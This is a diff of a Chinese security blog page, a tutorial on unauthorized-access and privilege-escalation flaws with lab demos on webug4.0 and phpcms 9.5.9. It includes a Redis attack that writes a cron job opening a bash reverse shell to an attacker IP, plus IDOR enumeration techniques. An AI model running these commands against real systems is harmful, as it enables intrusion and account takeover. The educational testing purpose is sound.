@@ -20,17 +20,27 @@
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
     <title>越权/未授权访问 ~ Misaki&#39;s Blog</title>
-    <link rel="stylesheet" href="/css/Material_Icons.css">
-    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/css/main.css">
     
-        <link rel="stylesheet" href="/css/post.css">
+<link rel="stylesheet" href="/css/main.css">
+
+    
         
-            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
         
     
-</head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class=" sidebar-collapse">
 <nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
@@ -117,133 +127,147 @@
 <h2 id="0x02、漏洞原理"><a href="#0x02、漏洞原理" class="headerlink" title="0x02、漏洞原理"></a>0x02、漏洞原理</h2><p>未授权访问是系统对用户限制不全，或者无限制，可以让任意用户或者限制访问用户，可以访问到内部敏感信息，导致的信息泄露，以及系统功能的执行。越权漏洞的产生原因是未对访问功能做权限的效对，或者限制不全，导致对用户的限制只局限于某一个功能和操作上。</p>
 <h2 id="0x03、漏洞危害"><a href="#0x03、漏洞危害" class="headerlink" title="0x03、漏洞危害"></a>0x03、漏洞危害</h2><p>未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。而越权可以分为水平越权和垂直越权。垂直越权漏洞会导致低权限用户用来执行高权限用户的功能，获取高权限用户的账号信息，执行高权限用户的操作功能。水平越权会导致同一层级间的用户可以互相访问到对方的敏感信息，如保存的地址、手机号、订单记录。同时还可能会以其他平级权限用户的身份来执行某行功能，如购买，删除，添加，修改等。</p>
 <h2 id="0x04、漏洞测试方法"><a href="#0x04、漏洞测试方法" class="headerlink" title="0x04、漏洞测试方法"></a>0x04、漏洞测试方法</h2><h3 id="0x04-1、常见的未授权服务"><a href="#0x04-1、常见的未授权服务" class="headerlink" title="0x04-1、常见的未授权服务"></a>0x04-1、常见的未授权服务</h3><h4 id="0x04-1-1、redis未授权访问"><a href="#0x04-1-1、redis未授权访问" class="headerlink" title="0x04-1-1、redis未授权访问"></a>0x04-1-1、redis未授权访问</h4><p>此问题在互联网上曾经多数存在，redis默认开放6379端口，且对外开放。可以通过此端口来执行命令写入文件来反弹shell。</p>
-<pre><code>root@kali:~# redis-cli -h 192.168.63.130
-192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;
+<pre class="line-numbers language-none"><code class="language-none">root@kali:~# redis-cli -h 192.168.63.130
+192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.63.128&#x2F;7999 0&gt;&amp;1\n&quot;
 OK
-192.168.63.130:6379&gt; config set dir /var/spool/cron/
+192.168.63.130:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;
 OK
 192.168.63.130:6379&gt; config set dbfilename root
 OK
 192.168.63.130:6379&gt; save
-OK
-</code></pre><h4 id="0x04-1-2、Jenkins未授权访问"><a href="#0x04-1-2、Jenkins未授权访问" class="headerlink" title="0x04-1-2、Jenkins未授权访问"></a>0x04-1-2、Jenkins未授权访问</h4><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
-<pre><code>http://www.secpulse.com:8080/manage
-http://www.secpulse.com:8080/script
-</code></pre><p>选择脚本命令行可以执行一些系统命令。</p>
+OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="0x04-1-2、Jenkins未授权访问"><a href="#0x04-1-2、Jenkins未授权访问" class="headerlink" title="0x04-1-2、Jenkins未授权访问"></a>0x04-1-2、Jenkins未授权访问</h4><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.secpulse.com:8080&#x2F;manage
+http:&#x2F;&#x2F;www.secpulse.com:8080&#x2F;script<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>选择脚本命令行可以执行一些系统命令。</p>
 <h4 id="0x04-1-3、MongoDB未授权访问"><a href="#0x04-1-3、MongoDB未授权访问" class="headerlink" title="0x04-1-3、MongoDB未授权访问"></a>0x04-1-3、MongoDB未授权访问</h4><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</p>
 <p>默认开启在27017端口，新版早就默认绑定在本地，之前的老版本仍有一些在互联网上开放在跑的端口。</p>
 <h4 id="0x04-1-4、Memcache未授权访问"><a href="#0x04-1-4、Memcache未授权访问" class="headerlink" title="0x04-1-4、Memcache未授权访问"></a>0x04-1-4、Memcache未授权访问</h4><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p>
 <p>默认开启在11211端口，可以使用端口连接工具或者命令，nc等，连接成功则存在。</p>
-<p>关于未授权访问的可以查看：<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/61101.html</a></p>
+<p>关于未授权访问的可以查看：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/61101.html">https://www.secpulse.com/archives/61101.html</a></p>
 <h3 id="0x04-2、基于用户ID的越权"><a href="#0x04-2、基于用户ID的越权" class="headerlink" title="0x04-2、基于用户ID的越权"></a>0x04-2、基于用户ID的越权</h3><p>举个例子：</p>
-<pre><code>https://www.xxx.com/user1/userinfo.php?user_id=user1
-https://www.xxx.com/user1/userinfo.php?user_id=10001
-</code></pre><p>我们登陆某个系统后，看到某些功能上获取信息的方式类似于上链接时，可以初步判断获取信息的方式为根据user_id来获对应的用户信息，如果参数为用户名，我们可以手机用户名字典来枚举信息，根据返回值判断是否存在问题。当然如果枚举较大，系统用户数量又不是很多的情况下，可以尝试注册新用户，利用新用户的用户名来测试是否可以获取到用户信息。</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;userinfo.php?user_id&#x3D;user1
+https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;userinfo.php?user_id&#x3D;10001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>我们登陆某个系统后，看到某些功能上获取信息的方式类似于上链接时，可以初步判断获取信息的方式为根据user_id来获对应的用户信息，如果参数为用户名，我们可以手机用户名字典来枚举信息，根据返回值判断是否存在问题。当然如果枚举较大，系统用户数量又不是很多的情况下，可以尝试注册新用户，利用新用户的用户名来测试是否可以获取到用户信息。</p>
 <p>如果参数为一个固定的数字串时，遍历数字串即可，这种情况下是系统对每个注册用户进行了一个用户id的排序，在众多的开源CMS上都有使用，当然这个字符串也有可能是随机，如果是随机的，量不大的情况下可以采用遍历的形式获取，量较大可以利用burp的随机数爆破，或者同样自己注册账户来测试。</p>
 <h3 id="0x04-3、基于功能对象ID的越权"><a href="#0x04-3、基于功能对象ID的越权" class="headerlink" title="0x04-3、基于功能对象ID的越权"></a>0x04-3、基于功能对象ID的越权</h3><p>举个例子：</p>
-<pre><code>https://www.xxx.com/user1/userticket.php?user_order=100001
-https://www.xxx.com/user1/userticket.php?user_order=49ba59ab
-</code></pre><p>此问题大量存在于用户订单、购买、查询等功能的商家CMS上，例如以上地址，如果user_order是订单编号，那么我们可以尝试遍历订单地址来查询是否存在越权。如果编号并不是单纯的订单数字串，而是类似如上的编码字符串，相信自己的运气的话可以尝试某些编码的情况，例如BASE64、MD5。猜测不到，或者不能明显的看出来是如果做的处理，注册新账号重新下单，会是简单方便的选择。</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;userticket.php?user_order&#x3D;100001
+https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;userticket.php?user_order&#x3D;49ba59ab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>此问题大量存在于用户订单、购买、查询等功能的商家CMS上，例如以上地址，如果user_order是订单编号，那么我们可以尝试遍历订单地址来查询是否存在越权。如果编号并不是单纯的订单数字串，而是类似如上的编码字符串，相信自己的运气的话可以尝试某些编码的情况，例如BASE64、MD5。猜测不到，或者不能明显的看出来是如果做的处理，注册新账号重新下单，会是简单方便的选择。</p>
 <h3 id="0x04-4、基于上传文件对象ID的越权"><a href="#0x04-4、基于上传文件对象ID的越权" class="headerlink" title="0x04-4、基于上传文件对象ID的越权"></a>0x04-4、基于上传文件对象ID的越权</h3><p>举个例子：</p>
-<pre><code>https://www.xxx.com/user1/userfile.php?fileid=10001
-https://www.ccc.com/user1/userfile.php?fileid=user1_name.jpg
-</code></pre><p>这种上传文件后，可以越权查看其他用户的上传文件也是经常发现类似的问题。假设，系统要求我们上传个人的身份证，实名认证信息、购买的发票订单等。如果上传后看到类似如上地址，可以猜测此上传文件可以遍历获取，同过查询fileid来查看其他用户的上传信息。如果上传后文件名如第二种，可能此文件是系统经过重命名的，重命名的方式一般采用当前上传的时间戳或者当前上传的日期加随机字段，这种情况下枚举较为困难，但仍然可以采用注册新用户的方式来查看是否存在越权。顺便一问，如果是<a href="http://www.ccc.com获取信息的方式，还可能会有什么问题呢？" target="_blank" rel="noopener">www.ccc.com获取信息的方式，还可能会有什么问题呢？</a></p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;userfile.php?fileid&#x3D;10001
+https:&#x2F;&#x2F;www.ccc.com&#x2F;user1&#x2F;userfile.php?fileid&#x3D;user1_name.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>这种上传文件后，可以越权查看其他用户的上传文件也是经常发现类似的问题。假设，系统要求我们上传个人的身份证，实名认证信息、购买的发票订单等。如果上传后看到类似如上地址，可以猜测此上传文件可以遍历获取，同过查询fileid来查看其他用户的上传信息。如果上传后文件名如第二种，可能此文件是系统经过重命名的，重命名的方式一般采用当前上传的时间戳或者当前上传的日期加随机字段，这种情况下枚举较为困难，但仍然可以采用注册新用户的方式来查看是否存在越权。顺便一问，如果是<a href="http://www.ccc.com获取信息的方式，还可能会有什么问题呢？">www.ccc.com获取信息的方式，还可能会有什么问题呢？</a></p>
 <h3 id="0x04-5、基于未授权访问的越权"><a href="#0x04-5、基于未授权访问的越权" class="headerlink" title="0x04-5、基于未授权访问的越权"></a>0x04-5、基于未授权访问的越权</h3><p>举个例子：</p>
-<pre><code>https://www.xxx.com/user1/user.php?user=user1@user.com
-</code></pre><p>在一些系统上登陆用户后，可以看到类似如上的地址链接，可能你会觉得这个跟问题1类似，但是也有可能多一张问题情况，在非登陆的情况下仍然可以访问到详细信息。如果可以，则证明后端对身份的效验只是基于参数user，并没有效验用户的session是否已登陆。此问题曾发现于一个系统后端支付订单复核的功能中，问题可想而知。</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.xxx.com&#x2F;user1&#x2F;user.php?user&#x3D;user1@user.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在一些系统上登陆用户后，可以看到类似如上的地址链接，可能你会觉得这个跟问题1类似，但是也有可能多一张问题情况，在非登陆的情况下仍然可以访问到详细信息。如果可以，则证明后端对身份的效验只是基于参数user，并没有效验用户的session是否已登陆。此问题曾发现于一个系统后端支付订单复核的功能中，问题可想而知。</p>
 <h3 id="0x04-6、基于功能地址的越权"><a href="#0x04-6、基于功能地址的越权" class="headerlink" title="0x04-6、基于功能地址的越权"></a>0x04-6、基于功能地址的越权</h3><p>举个例子：</p>
-<pre><code>https://www.xxx.com/user/getuserinfo.php
-</code></pre><p>如上地址，正常情况下，只访问此后台地址时，一般会跳转到登陆地址，或者登陆后用来查看某个具体的功能，获取数据的情况根据访问的链接地址来，理论上此功能并不存在越权可能，因为没有我们可以修改的参数。但是对权限及功能的限制可能只局限于用户菜单的限制，根据常用链接，可以猜测是否存在以下地址：</p>
-<pre><code>/getuserorder.php
-/adduser.php
-/deluser.php
-/getalluser.php
-/todetailpage.php
-/ordercreate.php
-......
-</code></pre><p>因为在绝大部分系统中，开发为了方便区别功能和页面，通常会利用对应的英文来命名文件，但这些文件并不是任意用户都可以访问到的，所以可以猜测访问地址是否英文的拼接来猜测路径。对于此问题的快捷测试是获取一个高权限账号，当然对于未授权测试来说，很难实现。</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.xxx.com&#x2F;user&#x2F;getuserinfo.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如上地址，正常情况下，只访问此后台地址时，一般会跳转到登陆地址，或者登陆后用来查看某个具体的功能，获取数据的情况根据访问的链接地址来，理论上此功能并不存在越权可能，因为没有我们可以修改的参数。但是对权限及功能的限制可能只局限于用户菜单的限制，根据常用链接，可以猜测是否存在以下地址：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;getuserorder.php
+&#x2F;adduser.php
+&#x2F;deluser.php
+&#x2F;getalluser.php
+&#x2F;todetailpage.php
+&#x2F;ordercreate.php
+......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因为在绝大部分系统中，开发为了方便区别功能和页面，通常会利用对应的英文来命名文件，但这些文件并不是任意用户都可以访问到的，所以可以猜测访问地址是否英文的拼接来猜测路径。对于此问题的快捷测试是获取一个高权限账号，当然对于未授权测试来说，很难实现。</p>
 <h3 id="0x04-7、基于接口身份的越权"><a href="#0x04-7、基于接口身份的越权" class="headerlink" title="0x04-7、基于接口身份的越权"></a>0x04-7、基于接口身份的越权</h3><p>举个例子：</p>
-<pre><code>https://www.xxx.com/user/userinfo.php
-post: {&#39;userid&#39;:&#39;10001&#39;,&#39;username&#39;:&#39;name&#39;,&#39;userage&#39;:&#39;18&#39;,&#39;usermobile&#39;:&#39;18080808888&#39;}
-</code></pre><p>例如如上接口，修改用户信息，当我们点击某个系统的修改自身资料时，会发送一个类似的json数据包，其中userid对应我们自己的用户id，修改后，可以修改对应id的用户资料。修改方式类似问题1。区别在于一个页面可见，一个页面不直观可见，一个查询，一个修改。需要配合其他越权查询漏洞，或者账号来识别是否修改成功。</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.xxx.com&#x2F;user&#x2F;userinfo.php
+post: &#123;&#39;userid&#39;:&#39;10001&#39;,&#39;username&#39;:&#39;name&#39;,&#39;userage&#39;:&#39;18&#39;,&#39;usermobile&#39;:&#39;18080808888&#39;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>例如如上接口，修改用户信息，当我们点击某个系统的修改自身资料时，会发送一个类似的json数据包，其中userid对应我们自己的用户id，修改后，可以修改对应id的用户资料。修改方式类似问题1。区别在于一个页面可见，一个页面不直观可见，一个查询，一个修改。需要配合其他越权查询漏洞，或者账号来识别是否修改成功。</p>
 <h2 id="0x05、漏洞靶场"><a href="#0x05、漏洞靶场" class="headerlink" title="0x05、漏洞靶场"></a>0x05、漏洞靶场</h2><p>漏洞环境：phpstudy，webug4.0</p>
 <p>靶场介绍：国产靶场，漏洞齐全，演示也相当完善。其中还分为初，中，高。虽然高好像没东西，但仍然是一个不错的靶场环境。</p>
 <p>漏洞演示：演示为靶场的22号漏洞，越权修改密码</p>
-<p>靶场安装：<a href="https://github.com/wangai3176/webug4.0，本来也给了一个vm的安装环境，但是那个百度云打不开了。就直接用文件自己安装，也没找到安装教程，就摸索着如下安装了。" target="_blank" rel="noopener">https://github.com/wangai3176/webug4.0，本来也给了一个vm的安装环境，但是那个百度云打不开了。就直接用文件自己安装，也没找到安装教程，就摸索着如下安装了。</a></p>
+<p>靶场安装：<a target="_blank" rel="noopener" href="https://github.com/wangai3176/webug4.0%EF%BC%8C%E6%9C%AC%E6%9D%A5%E4%B9%9F%E7%BB%99%E4%BA%86%E4%B8%80%E4%B8%AAvm%E7%9A%84%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83%EF%BC%8C%E4%BD%86%E6%98%AF%E9%82%A3%E4%B8%AA%E7%99%BE%E5%BA%A6%E4%BA%91%E6%89%93%E4%B8%8D%E5%BC%80%E4%BA%86%E3%80%82%E5%B0%B1%E7%9B%B4%E6%8E%A5%E7%94%A8%E6%96%87%E4%BB%B6%E8%87%AA%E5%B7%B1%E5%AE%89%E8%A3%85%EF%BC%8C%E4%B9%9F%E6%B2%A1%E6%89%BE%E5%88%B0%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%EF%BC%8C%E5%B0%B1%E6%91%B8%E7%B4%A2%E7%9D%80%E5%A6%82%E4%B8%8B%E5%AE%89%E8%A3%85%E4%BA%86%E3%80%82">https://github.com/wangai3176/webug4.0，本来也给了一个vm的安装环境，但是那个百度云打不开了。就直接用文件自己安装，也没找到安装教程，就摸索着如下安装了。</a></p>
 <p>把sql目录中的文件安装到数据库，新建三个按照文件名的数据库，导入数据文件，修改data目录下的dbconfig和dbconn文件，修改为自己的数据库账号密码和数据库名。修改完成后建议把网站目录修改为webug的目录下。直接访问本地地址即可。</p>
-<p><img src="\2019\06\越权-未授权访问\1560762175585.png" alt="1560762175585"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762175585.png" alt="1560762175585"></p>
 <p>另外需要修改/control/auth_cross/cross_auth_passwd.php文件下的一段代码，不然跳转到错误路径：</p>
-<pre><code>header(&quot;Location:/pt_env/control/auth_cross/cross_auth_passwd2.php?id={$id}&quot;)
+<pre class="line-numbers language-none"><code class="language-none">header(&quot;Location:&#x2F;pt_env&#x2F;control&#x2F;auth_cross&#x2F;cross_auth_passwd2.php?id&#x3D;&#123;$id&#125;&quot;)
 修改为：
-header(&quot;Location:/control/auth_cross/cross_auth_passwd2.php?id={$id}&quot;)
-</code></pre><p>点击第一个越权修改密码后进入如下页面：</p>
-<p><img src="\2019\06\越权-未授权访问\1560762425340.png" alt="1560762425340"></p>
+header(&quot;Location:&#x2F;control&#x2F;auth_cross&#x2F;cross_auth_passwd2.php?id&#x3D;&#123;$id&#125;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>点击第一个越权修改密码后进入如下页面：</p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762425340.png" alt="1560762425340"></p>
 <p>此处我打开了数据库来对应查看修改密码的情况，打开webug数据库下的user_test表，可以看到其中有两个用户如下：</p>
-<p><img src="\2019\06\越权-未授权访问\1560762734951.png" alt="1560762734951"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762734951.png" alt="1560762734951"></p>
 <p>此处利用aaaaa用户修改admin用户密码，利用aaaaa账户登陆后，看到如下界面</p>
-<p><img src="\2019\06\越权-未授权访问\1560762941147.png" alt="1560762941147"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560762941147.png" alt="1560762941147"></p>
 <p>此处，我们可以先正常走一遍逻辑来查看其中的数据包情况，把aaaaa的密码修改为aaaaa，弹窗OK。然后查看抓取到的数据包。</p>
-<p><img src="\2019\06\越权-未授权访问\1560763134387.png" alt="1560763134387"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763134387.png" alt="1560763134387"></p>
 <p>其中有旧密码和新密码两个参数，理论上如果效验了旧密码和账号的一致性，就算链接中的id可以修改越权也无法修改密码，会提示旧密码不正确，但此处并没有效验旧密码和账号的一致性，导致修改链接中的2为1，post参数不变，或者任意旧密码值，便可以修改admin的密码。</p>
-<p><img src="\2019\06\越权-未授权访问\1560763314987.png" alt="1560763314987"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763314987.png" alt="1560763314987"></p>
 <p>查看数据库修改是否成功：</p>
-<p><img src="\2019\06\越权-未授权访问\1560763331000.png" alt="1560763331000"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763331000.png" alt="1560763331000"></p>
 <p>此处的问题存在两点，一是修改的用户身份由链接中的ID来决定，二是没有对旧密码和账户进行身份验证。</p>
 <h2 id="0x06、测试工具"><a href="#0x06、测试工具" class="headerlink" title="0x06、测试工具"></a>0x06、测试工具</h2><p>对于越权类的安全问题，并没有自动化测试工具来发现和识别，至少现在没有发现哪里有完善的越权检测工具和扫描器。</p>
 <p>此处介绍一款burp的越权插件，辅助检测越权漏洞，但是只能检测基于功能的越权，并不能自动的检测需要修改参数来判断越权形式的漏洞。</p>
 <p>在burp的Extender选项中选择BApp Store选项卡，找到Authz插件，点击install。安装完成后选项卡中会出现一个Authz的新选项卡，界面如下：</p>
-<p><img src="\2019\06\越权-未授权访问\1560763815165.png" alt="1560763815165"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763815165.png" alt="1560763815165"></p>
 <p>此处需要两个用户身份，假设为A用户和B用户，登陆A用户的账号，获取Cookie到new header中，使用B账号抓包获取信息。到proxy中选择需要测试的功能地址，右键到Send requests to Authz。</p>
-<p><img src="\2019\06\越权-未授权访问\1560763954202.png" alt="1560763954202"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560763954202.png" alt="1560763954202"></p>
 <p>获取够需要测试的功能后，到Authz界面点击run即可运行，此处没有设置cookie，那么将按照未授权访问来测试。</p>
-<p><img src="\2019\06\越权-未授权访问\1560764399936.png" alt="1560764399936"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560764399936.png" alt="1560764399936"></p>
 <p>其中，会在请求中替换我们输入的cookie值，如图显示，源请求的字节长度，请求的字节长度，源请求的响应码，请求的响应码，通过对响应的差别来查看是否存在越权漏洞。</p>
 <p>能达到此检测目的的还有一款插件AuthMatrix，也同样可以检测越权，功能强劲，使用较Authz复杂，对于高要求，多用户，需要对请求中的token等进行选择替换的，可以使用此插件。</p>
-<p>介绍地址：<a href="https://github.com/portswigger/auth-matrix" target="_blank" rel="noopener">https://github.com/portswigger/auth-matrix</a></p>
+<p>介绍地址：<a target="_blank" rel="noopener" href="https://github.com/portswigger/auth-matrix">https://github.com/portswigger/auth-matrix</a></p>
 <h2 id="0x07、CMS演示"><a href="#0x07、CMS演示" class="headerlink" title="0x07、CMS演示"></a>0x07、CMS演示</h2><h3 id="0x07-1、前台任意修改其他用户信息"><a href="#0x07-1、前台任意修改其他用户信息" class="headerlink" title="0x07-1、前台任意修改其他用户信息"></a>0x07-1、前台任意修改其他用户信息</h3><p>漏洞环境：phpstudy，phpcms9.5.9</p>
 <p>漏洞介绍：phpcms设计缺陷导致前台用户可以任意修改其他用户密码</p>
-<p>漏洞下载：<a href="http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip" target="_blank" rel="noopener">http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip</a></p>
-<p>解压安装到phpstudy，访问后需要安装，按照安装要求，填入账号密码。等待安装完成，将自动跳转到后台管理页面。登陆后台需要先添加邮箱认证，如下添加的腾讯邮箱。具体腾讯授权码获取方式可以查看：<a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256" target="_blank" rel="noopener">https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256</a></p>
-<p><img src="\2019\06\越权-未授权访问\1560820634816.png" alt="1560820634816"></p>
+<p>漏洞下载：<a target="_blank" rel="noopener" href="http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip">http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip</a></p>
+<p>解压安装到phpstudy，访问后需要安装，按照安装要求，填入账号密码。等待安装完成，将自动跳转到后台管理页面。登陆后台需要先添加邮箱认证，如下添加的腾讯邮箱。具体腾讯授权码获取方式可以查看：<a target="_blank" rel="noopener" href="https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256">https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256</a></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560820634816.png" alt="1560820634816"></p>
 <p>在用户模块中添加如下信息，新增两个测试用户，类似如下，需要其中一个可以接收邮件。</p>
-<p><img src="\2019\06\越权-未授权访问\1560820798272.png" alt="1560820798272"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560820798272.png" alt="1560820798272"></p>
 <p>在站点首页点击登陆处，如果跳转到404安装页面，可能是你没有删除install安装目录，删除访问index.php即可。选择忘记密码-&gt;用户名找回密码</p>
-<p><img src="\2019\06\越权-未授权访问\1560824925363.png" alt="1560824925363"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560824925363.png" alt="1560824925363"></p>
 <p>点击获取邮箱效验码</p>
-<p><img src="\2019\06\越权-未授权访问\1560824994228.png" alt="1560824994228"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560824994228.png" alt="1560824994228"></p>
 <p>返回上一步输入想修改的用户，如下test2</p>
-<p><img src="\2019\06\越权-未授权访问\1560825360733.png" alt="1560825360733"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825360733.png" alt="1560825360733"></p>
 <p>输入之前的邮箱验证码提交</p>
-<p><img src="\2019\06\越权-未授权访问\1560825402669.png" alt="1560825402669"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825402669.png" alt="1560825402669"></p>
 <p>点击后显示密码修改成功为以下：</p>
-<p><img src="\2019\06\越权-未授权访问\1560825420971.png" alt="1560825420971"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825420971.png" alt="1560825420971"></p>
 <p>尝试使用新密码登陆成功：</p>
-<p><img src="\2019\06\越权-未授权访问\1560825511643.png" alt="1560825511643"></p>
+<p><img src="%5C2019%5C06%5C%E8%B6%8A%E6%9D%83-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%5C1560825511643.png" alt="1560825511643"></p>
 <p>漏洞修复：此问题出现原因在于验证码没有跟账号做绑定，验证时只做了验证码是否有效的判断。对于此类问题，频繁出现在手机号验证码，邮箱验证码处，在最后执行修改时需要一同验证，验证码和手机或者邮箱的对应关系。</p>
 <h3 id="0x07-2、redis未授权访问"><a href="#0x07-2、redis未授权访问" class="headerlink" title="0x07-2、redis未授权访问"></a>0x07-2、redis未授权访问</h3><p>漏洞环境：Ubuntu，reids 3.2.0</p>
 <p>漏洞介绍：Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以写入文件来反弹shell</p>
 <p>安装如下：</p>
-<pre><code>wget http://download.redis.io/releases/redis-3.2.0.tar.gz
+<pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gz
 tar xzf redis-3.2.0.tar.gz
 cd redis-3.2.0
-make
-</code></pre><p>修改配置文件</p>
-<pre><code>vi redis.conf
